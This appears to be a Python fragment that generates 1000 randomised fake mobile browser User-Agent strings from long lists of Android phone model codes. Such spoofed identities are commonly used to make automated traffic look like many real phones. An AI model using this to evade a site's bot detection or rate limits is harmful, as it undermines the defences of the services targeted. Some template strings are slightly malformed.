for xd in range(1000):
    rr = random.randint
    rc = random.choice
    aZ = str(
        rc(
            [
                "A",
                "B",
                "C",
                "D",
                "E",
                "F",
                "G",
                "H",
                "I",
                "J",
                "K",
                "L",
                "M",
                "N",
                "O",
                "P",
                "Q",
                "R",
                "S",
                "T",
                "U",
                "V",
                "W",
                "X",
                "Y",
                "Z",
            ]
        )
    )
    lonte = f"{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}{str(rr(11,99))}{str(rc(aZ))}"
    vivo = [
        "V2011A",
        "V1932A",
        "V2206",
        "V2201",
        "V2143",
        "V1950A",
        "Y55A",
        "V2104",
        "V2221",
        "V2158",
        "V2203A",
        "V2172A",
        "V1818A",
        "1904",
    ]
    oppo = [
        "CNM632",
        "CPH1869",
        "CPH1929",
        "CPH2107",
        "CPH2238",
        "CPH2351",
        "CPH2389",
        "CPH2407",
        "CPH2417",
        "CPH2419",
        "CPH2451",
        "CPH2455",
        "CPH2461",
        "CPH8893",
        "CPH1909",
    ]
    redmi = [
        "2201116SI",
        "M2012K11AI",
        "22011119TI",
        "21091116UI",
        "M2102K1AC",
        "M2012K11I",
        "22041219I",
        "22041216I",
        "2203121C",
        "2106118C",
        "2201123G",
        "2203129G",
        "2201122G",
        "2201122C",
        "2206122SC",
        "22081212C",
        "2112123AG",
        "2112123AC",
        "2109119BC",
        "M2002J9G",
        "M2007J1SC",
        "M2007J17I",
        "M2102J2SC",
        "M2007J3SY",
        "M2007J17G",
        "M2007J3SG",
        "M2011K2G",
        "M2101K9AG ",
        "M2101K9R",
        "2109119DG",
        "M2101K9G",
        "2109119DI",
        "M2012K11G",
        "M2102K1G",
        "21081111RG",
        "2107113SG",
        "21051182G",
        "M2105K81AC",
        "M2105K81C",
        "21061119DG",
        "21121119SG",
        "22011119UY",
        "21061119AG",
        "21061119AL",
        "22041219NY",
        "22041219G",
        "21061119BI",
        "220233L2G",
        "220233L2I",
        "220333QNY",
        "220333QAG",
        "M2004J7AC",
        "M2004J7BC",
        "M2004J19C",
        "M2006C3MII",
        "M2010J19SI",
        "M2006C3LG",
        "M2006C3LVG",
        "M2006C3MG",
        "M2006C3MT",
        "M2006C3MNG",
        "M2006C3LII",
        "M2010J19SL",
        "M2010J19SG",
        "M2010J19SY",
        "M2012K11AC",
        "M2012K10C",
        "M2012K11C",
        "22021211RC",
    ]
    realme = [
        "RMX3516",
        "RMX3371",
        "RMX3461",
        "RMX3286",
        "RMX3561",
        "RMX3388",
        "RMX3311",
        "RMX3142",
        "RMX2071",
        "RMX1805",
        "RMX1809",
        "RMX1801",
        "RMX1807",
        "RMX1803",
        "RMX1825",
        "RMX1821",
        "RMX1822",
        "RMX1833",
        "RMX1851",
        "RMX1853",
        "RMX1827",
        "RMX1911",
        "RMX1919",
        "RMX1927",
        "RMX1971",
        "RMX1973",
        "RMX2030",
        "RMX2032",
        "RMX1925",
        "RMX1929",
        "RMX2001",
        "RMX2061",
        "RMX2063",
        "RMX2040",
        "RMX2042",
        "RMX2002",
        "RMX2151",
        "RMX2163",
        "RMX2155",
        "RMX2170",
        "RMX2103",
        "RMX3085",
        "RMX3241",
        "RMX3081",
        "RMX3151",
        "RMX3381",
        "RMX3521",
        "RMX3474",
        "RMX3471",
        "RMX3472",
        "RMX3392",
        "RMX3393",
        "RMX3491",
        "RMX1811",
        "RMX2185",
        "RMX3231",
        "RMX2189",
        "RMX2180",
        "RMX2195",
        "RMX2101",
        "RMX1941",
        "RMX1945",
        "RMX3063",
        "RMX3061",
        "RMX3201",
        "RMX3203",
        "RMX3261",
        "RMX3263",
        "RMX3193",
        "RMX3191",
        "RMX3195",
        "RMX3197",
        "RMX3265",
        "RMX3268",
        "RMX3269",
        "RMX2027",
        "RMX2020",
        "RMX2021",
        "RMX3581",
        "RMX3501",
        "RMX3503",
        "RMX3511",
        "RMX3310",
        "RMX3312",
        "RMX3551",
        "RMX3301",
        "RMX3300",
        "RMX2202",
        "RMX3363",
        "RMX3360",
        "RMX3366",
        "RMX3361",
        "RMX3031",
        "RMX3370",
        "RMX3357",
        "RMX3560",
        "RMX3562",
        "RMX3350",
        "RMX2193",
        "RMX2161",
        "RMX2050",
        "RMX2156",
        "RMX3242",
        "RMX3171",
        "RMX3430",
        "RMX3235",
        "RMX3506",
        "RMX2117",
        "RMX2173",
        "RMX3161",
        "RMX2205",
        "RMX3462",
        "RMX3478",
        "RMX3372",
        "RMX3574",
        "RMX1831",
        "RMX3121",
        "RMX3122",
        "RMX3125",
        "RMX3043",
        "RMX3042",
        "RMX3041",
        "RMX3092",
        "RMX3093",
        "RMX3571",
        "RMX3475",
        "RMX2200",
        "RMX2201",
        "RMX2111",
        "RMX2112",
        "RMX1901",
        "RMX1903",
        "RMX1992",
        "RMX1993",
        "RMX1991",
        "RMX1931",
        "RMX2142",
        "RMX2081",
        "RMX2085",
        "RMX2083",
        "RMX2086",
        "RMX2144",
        "RMX2051",
        "RMX2025",
        "RMX2075",
        "RMX2076",
        "RMX2072",
        "RMX2052",
        "RMX2176",
        "RMX2121",
        "RMX3115",
        "RMX1921",
    ]
    infinix = [
        "X676B",
        "X687",
        "X609",
        "X697",
        "X680D",
        "X507",
        "X605",
        "X668",
        "X6815B",
        "X624",
        "X655F",
        "X689C",
        "X608",
        "X698",
        "X682B",
        "X682C",
        "X688C",
        "X688B",
        "X658E",
        "X659B",
        "X689B",
        "X689",
        "X689D",
        "X662",
        "X662B",
        "X675",
        "X6812B",
        "X6812",
        "X6817B",
        "X6817",
        "X6816C",
        "X6816",
        "X6816D",
        "X668C",
        "X665B",
        "X665E",
        "X510",
        "X559C",
        "X559F",
        "X559",
        "X606",
        "X606C",
        "X606D",
        "X623",
        "X624B",
        "X625C",
        "X625D",
        "X625B",
        "X650D",
        "X650B",
        "X650",
        "X650C",
        "X655C",
        "X655D",
        "X680B",
        "X573",
        "X573B",
        "X622",
        "X693",
        "X695C",
        "X695D",
        "X695",
        "X663B",
        "X663",
        "X670",
        "X671",
        "X671B",
        "X672",
        "X6819",
        "X572",
        "X572-LTE",
        "X571",
        "X604",
        "X610B",
        "X690",
        "X690B",
        "X656",
        "X692",
        "X683",
        "X450",
        "X5010",
        "X501",
        "X401",
        "X626",
        "X626B",
        "X652",
        "X652A",
        "X652B",
        "X652C",
        "X660B",
        "X660C",
        "X660",
        "X5515",
        "X5515F",
        "X5515I",
        "X609B",
        "X5514D",
        "X5516B",
        "X5516C",
        "X627",
        "X680",
        "X653",
        "X653C",
        "X657",
        "X657B",
        "X657C",
        "X6511B",
        "X6511E",
        "X6511",
        "X6512",
        "X6823C",
        "X612B",
        "X612",
        "X503",
        "X511",
        "X352",
        "X351",
        "X530",
        "X676C",
        "X6821",
        "X6823",
        "X6827",
        "X509",
        "X603",
        "X6815",
        "X620B",
        "X620",
        "X687B",
        "X6811B",
        "X6810",
        "X6811",
    ]
    mito = [
        "MITO A230",
        "Mito A67",
        "MITO A91",
        "MITO A17",
        "Mito_A35",
        "MITO T75",
        "MITO_A37_Z1",
        "MITO_A36_W1",
        "MITO A880",
        "MITO_A69",
        "MITO_A260",
    ]
    poco = [
        "22041219PG",
        "22041219PI",
        "M2010J19CG",
        "21091116AG",
        "M2102J20SG",
        "M2012K11AG",
        "M2007J20CG",
        "POCO F2 Pro",
        "2201116PG",
        "M2104K10I",
        "M2102J20SG",
        "2207117BPG",
    ]
    icherry = [
        "iCherry C251",
        "iCherry_C258",
        "iCherry C255",
        "C256",
        "iCherry C230",
        "iCherry_X1",
        "iCherry C233",
        "iCherry C229",
    ]
    samsung = [
        "SM-G361F",
        "SM-E135F",
        "SM-J700P",
        "SC-02L",
        "E025F",
        "G996B",
        "A826S",
        "E135F",
        "G781B",
        "G998B",
        "F936U1",
        "G361F",
        "A716S",
        "J327AZ",
        "E426B",
        "A015F",
        "A015M",
        "A013G",
        "A013G",
        "A013M",
        "A013F",
        "A022M",
        "A022G",
        "A022F",
        "A025M",
        "S124DL",
        "A025U",
        "A025A",
        "A025G",
        "A025F",
        "A025AZ",
        "A035F",
        "A035M",
        "A035G",
        "A032F",
        "A032M",
        "A032F",
        "A037F",
        "A037U",
        "A037M",
        "S134DL",
        "A037G",
        "A105G",
        "A105M",
        "A105F",
        "A105FN",
        "A102U",
        "S102DL",
        "A102U1",
        "A107F",
        "A107M",
        "A115AZ",
        "A115U",
        "A115U1",
        "A115A",
        "A115M",
        "A115F",
        "A125F",
        "A127F",
        "A125M",
        "A125U",
        "A127M",
        "A135F",
        "A137F",
        "A135M",
        "A136U",
        "A136U1",
        "A136W",
        "A260F",
        "A260G",
        "A260F",
        "A260G",
        "A205GN",
        "A205U",
        "A205F",
        "A205G",
        "A205FN",
        "A202F",
        "A2070",
        "A207F",
        "A207M",
        "A215U",
        "A215U1",
        "A217F",
        "A217F",
        "A217M",
        "A225F",
        "A225M",
        "A226B",
        "A226B",
        "A226BR",
        "A235F",
        "A235M",
        "A300FU",
        "A300F",
        "A300H",
        "A310F",
        "A310M",
        "A320FL",
        "A320F",
        "A305G",
        "A305GT",
        "A305N",
        "A305F",
        "A307FN",
        "A307G",
        "A307GN",
        "A315G",
        "A315F",
        "A325F",
        "A325M",
        "A326U",
        "A326W",
        "A336E",
        "A336B",
        "A430F",
        "A405FN",
        "A405FM",
        "A3051",
        "A3050",
        "A415F",
        "A426U",
        "A426B",
        "A5009",
        "A500YZ",
        "A500Y",
        "A500W",
        "A500L",
        "A500X",
        "A500XZ",
        "A510F",
        "A510Y",
        "A520F",
        "A520W",
        "A500F",
        "A500FU",
        "A500H",
        "S506DL",
        "A505G",
        "A505FN",
        "A505U",
        "A505GN",
        "A505F",
        "A507FN",
        "A5070",
        "A515F",
        "A515U",
        "A515U1",
        "A516U",
        "A516V",
        "A516N",
        "A516B",
        "A525F",
        "A525M",
        "A526U",
        "A526U1",
        "A526B",
        "A526W",
        "A528B",
        "A536B",
        "A536U",
        "A536E",
        "A536V",
        "A600FN",
        "A600G",
        "A605FN",
        "A605G",
        "A605GN",
        "A605F",
        "A6050",
        "A606Y",
        "A6060",
        "G6200",
        "A700FD",
        "A700F",
        "A7000",
        "A700H",
        "A700YD",
        "A710F",
        "A710M",
        "A720F",
        "A750F",
        "A750FN",
        "A750GN",
        "A705FN",
        "A705F",
        "A705MN",
        "A707F",
        "A715F",
        "A715W",
        "A716U",
        "A716V",
        "A716U1",
        "A716B",
        "A725F",
        "A725M",
        "A736B",
        "A530F",
        "A810YZ",
        "A810F",
        "A810S",
        "A530W",
        "A530N",
        "G885F",
        "G885Y",
        "G885S",
        "A730F",
        "A805F",
        "G887F",
        "G8870",
        "A9000",
        "A920F",
        "A920F",
        "G887N",
        "A910F",
        "G8850",
        "A908B",
        "A908N",
        "A9080",
        "G313HY",
        "G313MY",
        "G313MU",
        "G316M",
        "G316ML",
        "G316MY",
        "G313HZ",
        "G313H",
        "G313HU",
        "G313U",
        "G318H",
        "G357FZ",
        "G310HN",
        "G357FZ",
        "G850F",
        "G850M",
        "J337AZ",
        "G386T1",
        "G386T",
        "G3858",
        "G3858",
        "A226L",
        "C5000",
        "C500X",
        "C5010",
        "C5018",
        "C7000",
        "C7010",
        "C701F",
        "C7018",
        "C7100",
        "C7108",
        "C9000",
        "C900F",
        "C900Y",
        "G355H",
        "G355M",
        "G3589W",
        "G386W",
        "G386F",
        "G3518",
        "G3586V",
        "G5108Q",
        "G5108",
        "G3568V",
        "G350E",
        "G350",
        "G3509I",
        "G3508J",
        "G3502I",
        "G3502C",
        "S820L",
        "G360H",
        "G360F",
        "G360T",
        "G360M",
        "G361H",
        "E500H",
        "E500F",
        "E500M",
        "E5000",
        "E500YZ",
        "E700H",
        "E700F",
        "E7009",
        "E700M",
        "G3815",
        "G3815",
        "G3815",
        "F127G",
        "E225F",
        "E236B",
        "F415F",
        "E5260",
        "E625F",
        "F900U",
        "F907N",
        "F900F",
        "F9000",
        "F907B",
        "F900W",
        "G150NL",
        "G155S",
        "G1650",
        "W2015",
        "G7102",
        "G7105",
        "G7106",
        "G7108",
        "G7202",
        "G720N0",
        "G7200",
        "G720AX",
        "G530T1",
        "G530H",
        "G530FZ",
        "G531H",
        "G530BT",
        "G532F",
        "G531BT",
        "G531M",
        "J727AZ",
        "J100FN",
        "J100H",
        "J120FN",
        "J120H",
        "J120F",
        "J120M",
        "J111M",
        "J111F",
        "J110H",
        "J110G",
        "J110F",
        "J110M",
        "J105H",
        "J105Y",
        "J105B",
        "J106H",
        "J106F",
        "J106B",
        "J106M",
        "J200F",
        "J200M",
        "J200G",
        "J200H",
        "J200F",
        "J200GU",
        "J260M",
        "J260F",
        "J260MU",
        "J260F",
        "J260G",
        "J200BT",
        "G532G",
        "G532M",
        "G532MT",
        "J250M",
        "J250F",
        "J210F",
        "J260AZ",
        "J3109",
        "J320A",
        "J320G",
        "J320F",
        "J320H",
        "J320FN",
        "J330G",
        "J330F",
        "J330FN",
        "J337V",
        "J337P",
        "J337A",
        "J337VPP",
        "J337R4",
        "J327VPP",
        "J327V",
        "J327P",
        "J327R4",
        "S327VL",
        "S337TL",
        "S367VL",
        "J327A",
        "J327T1",
        "J327T",
        "J3110",
        "J3119S",
        "J3119",
        "S320VL",
        "J337T",
        "J400M",
        "J400F",
        "J400F",
        "J410F",
        "J410G",
        "J410F",
        "J415FN",
        "J415F",
        "J415G",
        "J415GN",
        "J415N",
        "J500FN",
        "J500M",
        "J510MN",
        "J510FN",
        "J510GN",
        "J530Y",
        "J530F",
        "J530G",
        "J530FM",
        "G570M",
        "G570F",
        "G570Y",
        "J600G",
        "J600FN",
        "J600GT",
        "J600F",
        "J610F",
        "J610G",
        "J610FN",
        "J710F",
        "J700H",
        "J700M",
        "J700F",
        "J700P",
        "J700T",
        "J710GN",
        "J700T1",
        "J727A",
        "J727R4",
        "J737T",
        "J737A",
        "J737R4",
        "J737V",
        "J737T1",
        "J737S",
        "J737P",
        "J737VPP",
        "J701F",
        "J701M",
        "J701MT",
        "S767VL",
        "S757BL",
        "J720F",
        "J720M",
        "G615F",
        "G615FU",
        "G610F",
        "G610M",
        "G610Y",
        "G611MT",
        "G611FF",
        "G611M",
        "J730G",
        "J730GM",
        "J730F",
        "J730FM",
        "S727VL",
        "S737TL",
        "J727T1",
        "J727T1",
        "J727V",
        "J727P",
        "J727VPP",
        "J727T",
        "C710F",
        "J810M",
        "J810F",
        "J810G",
        "J810Y",
        "A605K",
        "A605K",
        "A202K",
        "M336K",
        "A326K",
        "C115",
        "C115L",
        "C1158",
        "C1158",
        "C115W",
        "C115M",
        "S120VL",
        "M015G",
        "M015F",
        "M013F",
        "M017F",
        "M022G",
        "M022F",
        "M022M",
        "M025F",
        "M105G",
        "M105M",
        "M105F",
        "M107F",
        "M115F",
        "M115F",
        "M127F",
        "M127G",
        "M135M",
        "M135F",
        "M135FU",
        "M205FN",
        "M205F",
        "M205G",
        "M215F",
        "M215G",
        "M225FV",
        "M236B",
        "M236Q",
        "M305F",
        "M305M",
        "M307F",
        "M307FN",
        "M315F",
        "M317F",
        "M325FV",
        "M325F",
        "M326B",
        "M336B",
        "M336BU",
        "M405F",
        "M426B",
        "M515F",
        "M526BR",
        "M526B",
        "M536B",
        "M625F",
        "G750H",
        "G7508Q",
        "G7509",
        "N970U",
        "N970F",
        "N971N",
        "N970U1",
        "N770F",
        "N975U1",
        "N975U",
        "N975F",
        "N975F",
        "N976N",
        "N980F",
        "N981U",
        "N981B",
        "N985F",
        "N9860",
        "N986N",
        "N986U",
        "N986B",
        "N986W",
        "N9008V",
        "N9006",
        "N900A",
        "N9005",
        "N900W8",
        "N900",
        "N9009",
        "N900P",
        "N9000Q",
        "N9002",
        "9005",
        "N750L",
        "N7505",
        "N750",
        "N7502",
        "N910F",
        "N910V",
        "N910C",
        "N910U",
        "N910H",
        "N9108V",
        "N9100",
        "N915FY",
        "N9150",
        "N915T",
        "N915G",
        "N915A",
        "N915F",
        "N915S",
        "N915D",
        "N915W8",
        "N916S",
        "N916K",
        "N916L",
        "N916LSK",
        "N920L",
        "N920S",
        "N920G",
        "N920A",
        "N920C",
        "N920V",
        "N920I",
        "N920K",
        "N9208",
        "N930F",
        "N9300",
        "N930x",
        "N930P",
        "N930X",
        "N930W8",
        "N930V",
        "N930T",
        "N950U",
        "N950F",
        "N950N",
        "N960U",
        "N960F",
        "N960U",
        "N935F",
        "N935K",
        "N935S",
        "G550T",
        "G550FY",
        "G5500",
        "G5510",
        "G550T1",
        "S550TL",
        "G5520",
        "G5528",
        "G600FY",
        "G600F",
        "G6000",
        "G6100",
        "G610S",
        "G611F",
        "G611L",
        "G110M",
        "G110H",
        "G110B",
        "G910S",
        "G316HU",
        "G977N",
        "G973U1",
        "G973F",
        "G973W",
        "G973U",
        "G770U1",
        "G770F",
        "G975F",
        "G975U",
        "G970U",
        "G970U1",
        "G970F",
        "G970N",
        "G980F",
        "G981U",
        "G981N",
        "G981B",
        "G780G",
        "G780F",
        "G781W",
        "G781U",
        "G7810",
        "G9880",
        "G988B",
        "G988U",
        "G988B",
        "G988U1",
        "G985F",
        "G986U",
        "G986B",
        "G986W",
        "G986U1",
        "G991U",
        "G991B",
        "G990B",
        "G990E",
        "G990U",
        "G998U",
        "G996W",
        "G996U",
        "G996N",
        "G9960",
        "S901U",
        "S901B",
        "S908U",
        "S908U1",
        "S908B",
        "S9080",
        "S908N",
        "S908E",
        "S906U",
        "S906E",
        "S906N",
        "S906B",
        "S906U1",
        "G730V",
        "G730A",
        "G730W8",
        "C105L",
        "C101",
        "C105",
        "C105K",
        "C105S",
        "G900F",
        "G900P",
        "G900H",
        "G9006V",
        "G900M",
        "G900V",
        "G870W",
        "G890A",
        "G870A",
        "G900FD",
        "G860P",
        "G901F",
        "G901F",
        "G800F",
        "G800H",
        "G903F",
        "G903W",
        "G920F",
        "G920K",
        "G920I",
        "G920A",
        "G920P",
        "G920S",
        "G920V",
        "G920T",
        "G925F",
        "G925A",
        "G925W8",
        "G928F",
        "G928C",
        "G9280",
        "G9287",
        "G928T",
        "G928I",
        "G930A",
        "G930F",
        "G930W8",
        "G930S",
        "G930V",
        "G930P",
        "G930L",
        "G891A",
        "G935F",
        "G935T",
        "G935W8",
        "G9350",
        "G950F",
        "G950W",
        "G950U",
        "G892A",
        "G892U",
        "G8750",
        "G955F",
        "G955U",
        "G955U1",
        "G955W",
        "G955N",
        "G960U",
        "G960U1",
        "G960F",
        "G965U",
        "G965F",
        "G965U1",
        "G965N",
        "G9650",
        "J321AZ",
        "J326AZ",
        "J336AZ",
        "T116",
        "T116NU",
        "T116NY",
        "T116NQ",
        "T2519",
        "G318HZ",
        "T255S",
        "W2016",
        "W2018",
        "W2019",
        "W2021",
        "W2022",
        "G600S",
        "E426S",
        "G3812",
        "G3812B",
        "G3818",
        "G388F",
        "G389F",
        "G390F",
        "G398FN",
        "SM-A705FN",
        "SM-G975F",
        "SM-A107F",
        "SM-A336E",
        "SM-F711B",
        "SM-G6200",
        "SM-G361F",
        "SM-E426B",
        "SM-A826S",
        "SM-E426B",
    ]
    gt = [
        "GT-1015",
        "GT-1020",
        "GT-1030",
        "GT-1035",
        "GT-1040",
        "GT-1045",
        "GT-1050",
        "GT-1240",
        "GT-1440",
        "GT-1450",
        "GT-18190",
        "GT-18262",
        "GT-19060I",
        "GT-19082",
        "GT-19083",
        "GT-19105",
        "GT-19152",
        "GT-19192",
        "GT-19300",
        "GT-19505",
        "GT-2000",
        "GT-20000",
        "GT-200s",
        "GT-3000",
        "GT-414XOP",
        "GT-6918",
        "GT-7010",
        "GT-7020",
        "GT-7030",
        "GT-7040",
        "GT-7050",
        "GT-7100",
        "GT-7105",
        "GT-7110",
        "GT-7205",
        "GT-7210",
        "GT-7240R",
        "GT-7245",
        "GT-7303",
        "GT-7310",
        "GT-7320",
        "GT-7325",
        "GT-7326",
        "GT-7340",
        "GT-7405",
        "GT-7550 5GT-8005",
        "GT-8010",
        "GT-81",
        "GT-810",
        "GT-8105",
        "GT-8110",
        "GT-8220S",
        "GT-8410",
        "GT-9300",
        "GT-9320",
        "GT-93G",
        "GT-A7100",
        "GT-A9500",
        "GT-ANDROID",
        "GT-B2710",
        "GT-B5330",
        "GT-B5330B",
        "GT-B5330L",
        "GT-B5330ZKAINU",
        "GT-B5510",
        "GT-B5512",
        "GT-B5722",
        "GT-B7510",
        "GT-B7722",
        "GT-B7810",
        "GT-B9150",
        "GT-B9388",
        "GT-C3010",
        "GT-C3262",
        "GT-C3310R",
        "GT-C3312",
        "GT-C3312R",
        "GT-C3313T",
        "GT-C3322",
        "GT-C3322i",
        "GT-C3520",
        "GT-C3520I",
        "GT-C3592",
        "GT-C3595",
        "GT-C3782",
        "GT-C6712",
        "GT-E1282T",
        "GT-E1500",
        "GT-E2200",
        "GT-E2202",
        "GT-E2250",
        "GT-E2252",
        "GT-E2600",
        "GT-E2652W",
        "GT-E3210",
        "GT-E3309",
        "GT-E3309I",
        "GT-E3309T",
        "GT-G530H",
        "GT-g900f",
        "GT-G930F",
        "GT-H9500",
        "GT-I5508",
        "GT-I5801",
        "GT-I6410",
        "GT-I8150",
        "GT-I8160OKLTPA",
        "GT-I8160ZWLTTT",
        "GT-I8258",
        "GT-I8262D",
        "GT-I8268",
        "GT-I8505",
        "GT-I8530BAABTU",
        "GT-I8530BALCHO",
        "GT-I8530BALTTT",
        "GT-I8550E",
        "GT-i8700",
        "GT-I8750",
        "GT-I900",
        "GT-I9008L",
        "GT-i9040",
        "GT-I9080E",
        "GT-I9082C",
        "GT-I9082EWAINU",
        "GT-I9082i",
        "GT-I9100G",
        "GT-I9100LKLCHT",
        "GT-I9100M",
        "GT-I9100P",
        "GT-I9100T",
        "GT-I9105UANDBT",
        "GT-I9128E",
        "GT-I9128I",
        "GT-I9128V",
        "GT-I9158P",
        "GT-I9158V",
        "GT-I9168I",
        "GT-I9192I",
        "GT-I9195H",
        "GT-I9195L",
        "GT-I9250",
        "GT-I9303I",
        "GT-I9305N",
        "GT-I9308I",
        "GT-I9505G",
        "GT-I9505X",
        "GT-I9507V",
        "GT-I9600",
        "GT-m190",
        "GT-M5650",
        "GT-mini",
        "GT-N5000S",
        "GT-N5100",
        "GT-N5105",
        "GT-N5110",
        "GT-N5120",
        "GT-N7000B",
        "GT-N7005",
        "GT-N7100T",
        "GT-N7102",
        "GT-N7105",
        "GT-N7105T",
        "GT-N7108",
        "GT-N7108D",
        "GT-N8000",
        "GT-N8005",
        "GT-N8010",
        "GT-N8020",
        "GT-N9000",
        "GT-N9505",
        "GT-P1000CWAXSA",
        "GT-P1000M",
        "GT-P1000T",
        "GT-P1010",
        "GT-P3100B",
        "GT-P3105",
        "GT-P3108",
        "GT-P3110",
        "GT-P5100",
        "GT-P5200",
        "GT-P5210XD1",
        "GT-P5220",
        "GT-P6200",
        "GT-P6200L",
        "GT-P6201",
        "GT-P6210",
        "GT-P6211",
        "GT-P6800",
        "GT-P7100",
        "GT-P7300",
        "GT-P7300B",
        "GT-P7310",
        "GT-P7320",
        "GT-P7500D",
        "GT-P7500M",
        "GT-P7500R",
        "GT-P7500V",
        "GT-P7501",
        "GT-P7511",
        "GT-S3330",
        "GT-S3332",
        "GT-S3333",
        "GT-S3370",
        "GT-S3518",
        "GT-S3570",
        "GT-S3600i",
        "GT-S3650",
        "GT-S3653W",
        "GT-S3770K",
        "GT-S3770M",
        "GT-S3800W",
        "GT-S3802",
        "GT-S3850",
        "GT-S5220",
        "GT-S5220R",
        "GT-S5222",
        "GT-S5230",
        "GT-S5230W",
        "GT-S5233T",
        "GT-s5233w",
        "GT-S5250",
        "GT-S5253",
        "GT-s5260",
        "GT-S5280",
        "GT-S5282",
        "GT-S5283B",
        "GT-S5292",
        "GT-S5300",
        "GT-S5300L",
        "GT-S5301",
        "GT-S5301B",
        "GT-S5301L",
        "GT-S5302",
        "GT-S5302B",
        "GT-S5303",
        "GT-S5303B",
        "GT-S5310",
        "GT-S5310B",
        "GT-S5310C",
        "GT-S5310E",
        "GT-S5310G",
        "GT-S5310I",
        "GT-S5310L",
        "GT-S5310M",
        "GT-S5310N",
        "GT-S5312",
        "GT-S5312B",
        "GT-S5312C",
        "GT-S5312L",
        "GT-S5330",
        "GT-S5360",
        "GT-S5360B",
        "GT-S5360L",
        "GT-S5360T",
        "GT-S5363",
        "GT-S5367",
        "GT-S5369",
        "GT-S5380",
        "GT-S5380D",
        "GT-S5500",
        "GT-S5560",
        "GT-S5560i",
        "GT-S5570B",
        "GT-S5570I",
        "GT-S5570L",
        "GT-S5578",
        "GT-S5600",
        "GT-S5603",
        "GT-S5610",
        "GT-S5610K",
        "GT-S5611",
        "GT-S5620",
        "G-S5670",
        "GT-S5670B",
        "GT-S5670HKBZTA",
        "GT-S5690",
        "GT-S5690R",
        "GT-S5830",
        "GT-S5830D",
        "GT-S5830G",
        "GT-S5830i",
        "GT-S5830L",
        "GT-S5830M",
        "GT-S5830T",
        "GT-S5830V",
        "GT-S5831i",
        "GT-S5838",
        "GT-S5839i",
        "GT-S6010",
        "GT-S6010BBABTU",
        "GT-S6012",
        "GT-S6012B",
        "GT-S6102",
        "GT-S6102B",
        "GT-S6293T",
        "GT-S6310B",
        "GT-S6310ZWAMID",
        "GT-S6312",
        "GT-S6313T",
        "GT-S6352",
        "GT-S6500",
        "GT-S6500D",
        "GT-S6500L",
        "GT-S6790",
        "GT-S6790L",
        "GT-S6790N",
        "GT-S6792L",
        "GT-S6800",
        "GT-S6800HKAXFA",
        "GT-S6802",
        "GT-S6810",
        "GT-S6810B",
        "GT-S6810E",
        "GT-S6810L",
        "GT-S6810M",
        "GT-S6810MBASER",
        "GT-S6810P",
        "GT-S6812",
        "GT-S6812B",
        "GT-S6812C",
        "GT-S6812i",
        "GT-S6818",
        "GT-S6818V",
        "GT-S7230E",
        "GT-S7233E",
        "GT-S7250D",
        "GT-S7262",
        "GT-S7270",
        "GT-S7270L",
        "GT-S7272",
        "GT-S7272C",
        "GT-S7273T",
        "GT-S7278",
        "GT-S7278U",
        "GT-S7390",
        "GT-S7390G",
        "GT-S7390L",
        "GT-S7392",
        "GT-S7392L",
        "GT-S7500",
        "GT-S7500ABABTU",
        "GT-S7500ABADBT",
        "GT-S7500ABTTLP",
        "GT-S7500CWADBT",
        "GT-S7500L",
        "GT-S7500T",
        "GT-S7560",
        "GT-S7560M",
        "GT-S7562",
        "GT-S7562C",
        "GT-S7562i",
        "GT-S7562L",
        "GT-S7566",
        "GT-S7568",
        "GT-S7568I",
        "GT-S7572",
        "GT-S7580E",
        "GT-S7583T",
        "GT-S758X",
        "GT-S7592",
        "GT-S7710",
        "GT-S7710L",
        "GT-S7898",
        "GT-S7898I",
        "GT-S8500",
        "GT-S8530",
        "GT-S8600",
        "GT-STB919",
        "GT-T140",
        "GT-T150",
        "GT-V8a",
        "GT-V8i",
        "GT-VC818",
        "GT-VM919S",
        "GT-W131",
        "GT-W153",
        "GT-X831",
        "GT-X853",
        "GT-X870",
        "GT-X890",
        "GT-Y8750",
    ]
    iphonee = [
        "X 10_15_6",
        "X 10_8_5",
        "X 10.7",
        "X 10_6_8",
        "X 10.8",
        "X 10_8_4",
        "X 10_5_8",
        "X 10_8_3",
        "X 10.6",
        "X 10_7_5",
        "X 10_8_0",
        "X 10.5",
        "X 10_9",
        "X 10_7_2",
        "X 10_7_3",
        "X x.y",
        "X 10_5_4",
        "X Mach-O",
        "X 10.4",
        "X 10_6_1",
        "X 10_4_11",
        "X 10_11_6",
        "X 10_15_1",
        "X 10_14_3",
        "X 10.10.1",
        "X 10_12_1",
        "X 10_13_2",
        "X 10_12_5",
        "X 10_10_5",
        "X 10.2",
    ]
    strvoppo = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; {str(rc(oppo))} Build/{str(rc(lonte))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(90,109))}.0.{str(rr(111,6666))}.{str(rr(10,400))} UCBrowser/{str(rr(1,20))}.{str(rr(1,10))}.0.{str(rr(111,5555))} Mobile Safari/537.36 OPR/{str(rr(10,80))}.{str(rr(1,10))}.{str(rr(111,5555))}.{str(rr(111,99999))}"
    strvredmi = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; {str(rc(redmi))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(90,109))}.0.{str(rr(111,6666))}.{str(rr(10,400))} Mobile Safari/537.36"
    strvvivo = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; {str(rc(vivo))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(90,109))}.0.{str(rr(111,6666))}.{str(rr(10,400))} Mobile Safari/537.36"
    strvoppo1 = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; {str(rc(oppo))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(90,109))}.0.{str(rr(111,6666))}.{str(rr(10,400))} Mobile Safari/537.36"
    strvinfinix = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; {str(rc(infinix))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(90,109))}.0.{str(rr(111,6666))}.{str(rr(10,400))} Mobile Safari/537.36"
    strvmito = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; {str(rc(mito))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(90,109))}.0.{str(rr(111,6666))}.{str(rr(10,400))} Mobile Safari/537.36"
    strvicherry = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; {str(rc(icherry))}) Build/MRA58{str(rc(lonte))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(90,109))}.0.{str(rr(111,6666))}.{str(rr(10,400))} Mobile Safari/537.36"
